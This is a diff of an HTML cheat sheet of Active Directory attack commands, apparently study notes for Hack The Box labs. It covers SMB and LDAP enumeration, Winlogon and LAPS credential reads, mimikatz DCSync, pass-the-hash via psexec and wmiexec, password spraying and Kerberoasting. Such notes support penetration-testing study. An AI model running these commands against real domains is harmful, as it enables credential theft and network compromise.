@@ -31,17 +31,29 @@
         <div class="notion-body">
             <h2 id="Enumeration">Enumeration</h2>
             <ul>
-                <p> </p>
-                <pre><code class="language-bash">crackmapexec smb 10.10.11.174 #Basic SMB enumeration to check if it vulnerable to SMB relay (signing:False). Additionally you can get the domain name
-crackmapexec smb 10.10.11.250 -u USERNAME -p "PASSWORD" --rid-brute #Once you have a user you can rid-brute to show all users
-crackmapexec winrm 10.10.11.250 -u USERNAME -p "PASSWORD"           #Check for winrm 
-</code></pre>
+                <pre><code class="language-bash">crackmapexec smb 10.10.11.174  #Basic SMB enumeration to check if it vulnerable to SMB relay (signing:False). Additionally you can get the domain name
+crackmapexec winrm 10.10.11.250 -u USERNAME -p "PASSWORD"  #Check for winrm </code></pre>
 
-                
-                <p> To dump all ldap information</p>
-                <pre><code class="language-bash">ldapsearch -H ldap://DOMAIN_NAME -D 'USER@DOMAIN_NAME' -w 'PASSWORD' -b 'dc=DOMAIN_NAME,dc=SECOND_DOMAIN_NAME'</code></pre>
+            <p>To dump all ldap information</p>
+            <pre><code class="language-bash">ldapsearch -H ldap://DOMAIN_NAME -D 'USER@DOMAIN_NAME' -w 'PASSWORD' -b 'dc=DOMAIN_NAME,dc=SECOND_DOMAIN_NAME'</code></pre>
+            <p>Another tool to dump itneresting information is windapsearch.py</p>
+            <pre><code class="language-bash">python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -u</code></pre>
+            
+            <h3>User enumeration</h3>
+            <ul>
+                <p>User enumeration via ldapsearch </p>
+                <pre><code class="language-bash">ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "</code></pre>
                 <p>User enumration via SID</p>
                 <pre><code class="language-bash">impacket-lookupsid anonymous@10.10.11.35 -no-pass</code></pre>
+                <p>Once you have an username you can rid-brute</p>
+                <pre><code class="language-bash">crackmapexec smb 10.10.11.250 -u USERNAME -p "PASSWORD" --rid-brute #Once you have a user you can rid-brute to show all users
+crackmapexec smb 10.10.11.250 -u USERNAME -p "PASSWORD" --users</code></pre>
+            </ul>
+
+                
+                
 
 
                 <h3>Rpcclient</h3>
@@ -85,9 +97,50 @@ Select-Object Name, SamAccountName, LastKnownParent</code></pre>
 Restore-ADObject -Identity $guid</code></pre>
                 <p>Getting winlogon credentials</p>
                 <pre><code class="language-powershell">reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" </code></pre>
+                
+                <h3>Acquiring password policy</h3>
+                <p>Here we list some ways of acquiring</p>
+                <pre><code class="language-powershell">crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
+rpcclient $> getdompwinfo
+ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+net accounts #In case you have access to a computer
+PS C:\htb> import-module .\PowerView.ps1 & Get-DomainPolicy</code></pre>
+
+                 
+
+                
+            </ul>
+                
+                <h3></h3>
+                
+            </ul>
+
+            <h2 id="Enumerating security controls">Enumerating security controls</h2>
+            <ul>
+                <h3>Windows Defender</h3>
+                <ul>
+                <p>In order to check if windows defender is active we could use the following command</p>
+                <pre><code class="language-powershell">Get-MpComputerStatus</code></pre>
                 </ul>
                 
-                
+                <h3>AppLocker</h3>
+                <ul>
+                <p>App locker is a software for whitelisting programs on a computer. We can list the prohibited executables by using that in powershell</p>
+                <pre><code class="language-powershell">Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</code></pre>
+                <p>Here are listed all paths of powershell</p>
+                <pre><code class="language-powershell">32-bit (x86) PowerShell executable	%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+64-bit (x64) Powershell executable	%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe
+32-bit (x86) Powershell ISE executable	%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe
+64-bit (x64) Powershell ISE executable	%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell_ise.exe</code></pre>    
+                </ul>
+
+                <h3>LAPS (Local Administrator Password Solution)</h3>
+                <ul>
+                    <p>LAPS is used to randomize and rotate local administrator passwords on Windows hosts and prevent lateral movement. By using the following command we will be able to show the password expiration and if our user has rights the password in clear text</p>
+                    <pre><code class="language-powershell">Get-LAPSComputers</code></pre>
+                </ul>    
+            </ul>
+
             </ul>
             <h2>Exploitation</h2>
             <ul>
@@ -152,7 +205,9 @@ Restore-ADObject -Identity $guid</code></pre>
                     <p>Then crack the hash using hashcat. Hashcat codes can be found <a class="notion-link" href="https://hashcat.net/wiki/doku.php?id=example_hashes">Here</a></p>
                     <pre><code class="language-powershell">.\mimikatz.exe "lsadump::dcsync /domain:DOMAIN.LOCAL /user:Administrator exit"</code></pre>
                     <p>Capture the has NTLM and usit to pass the hash in psexec</p>
-                    <pre><code class="language-bash">impacket-psexec -hashes :HASH DOMAIN.LOCAL/Administrator@TARGET_IP</code></pre>  
+                    <pre><code class="language-bash">impacket-psexec -hashes :HASH DOMAIN.LOCAL/Administrator@TARGET_IP</code></pre>
+                    <p>or</p>
+                    <pre><code class="language-bash">wmiexec.py DOMAIN.local/USERNAME:'PASSWORD'@IP</code></pre>
                 </ul>
 
                 
@@ -178,7 +233,11 @@ Restore-ADObject -Identity $guid</code></pre>
 
                         <p>Password spray (One password a lot of users)</p>
                         <pre><code class="language-bash">kerbrute passwordspray --dc 10.10.11.69 -d fluffy.htb users.txt Password@1</code></pre>
-
+                        <ul>
+                            <p>Akternative in windows (\DomainPasswordSpray.ps1)</p>
+                            <pre><code class="language-powershell"> Import-Module .\DomainPasswordSpray.ps1
+ Invoke-DomainPasswordSpray -Password Winter2022 -OutFile success -ErrorAction SilentlyContinue</code></pre>
+                        </ul>
                         <p>Brute user (One user a lot of passwords)</p>
                         <pre><code class="language-bash">kerbrute bruteuser --dc 10.10.11.69 -d fluffy.htb /usr/share/wordlists/usernames.txt john </code></pre>
                     </ul>
@@ -195,7 +254,9 @@ Restore-ADObject -Identity $guid</code></pre>
                     <h3>Kerberoasting Attack</h3>
                     <ul>
                         <p>Allows an authenticated attacker to acquire tickets TGS of service accounts in the domain.</p>
-                        <pre><code class="language-bash"> impacket-GetUsersSPNs DOMAIN.LOCAL/USER:PASSWORD -dc-ip TARGET_IP -request</code></pre>
+                        <pre><code class="language-bash">impacket-GetUsersSPNs DOMAIN.LOCAL/USER:PASSWORD -dc-ip TARGET_IP -request
+impacket-GetUsersSPNs DOMAIN.LOCAL/USER:PASSWORD -dc-ip TARGET_IP -request-user USERNAME</code></pre>
+
                         <p>Then crack the hash using hashcat. Hashcat codes can be found <a class="notion-link" href="https://hashcat.net/wiki/doku.php?id=example_hashes">Here</a></p>
                         <pre><code class="language-bash">hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force</code></pre>
                         <p>Show the hash</p>
